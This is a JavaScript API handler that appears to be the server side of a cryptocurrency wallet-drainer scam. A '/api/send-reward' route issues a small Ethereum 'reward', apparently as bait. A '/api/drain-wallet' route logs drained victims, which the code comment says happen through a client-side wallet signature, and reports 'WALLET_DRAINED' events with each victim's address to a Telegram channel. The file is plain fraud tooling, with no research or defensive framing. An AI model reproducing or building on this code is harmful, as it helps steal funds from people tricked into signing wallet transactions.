import { sendRewardToUser } from './api/rewards.js';
import { notifyTelegram } from './api/telegram.js';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { userAddress } = req.body;
    
    if (req.url === '/api/send-reward') {
      const result = await sendRewardToUser(userAddress, process.env.CONTRACT_ADDRESS, 1); // Chain ID 1 for Ethereum
      if (result.success) {
        await notifyTelegram("REWARD_SENT", { userAddress, txHash: result.txHash });
        res.status(200).json({ success: true });
      } else {
        res.status(500).json({ success: false, error: result.error });
      }
    } else if (req.url === '/api/drain-wallet') {
      // This part is handled client-side via wallet signature, but we log it here
      await notifyTelegram("WALLET_DRAINED", { userAddress });
      res.status(200).json({ success: true });
    } else {
      res.status(400).json({ error: 'Invalid endpoint' });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}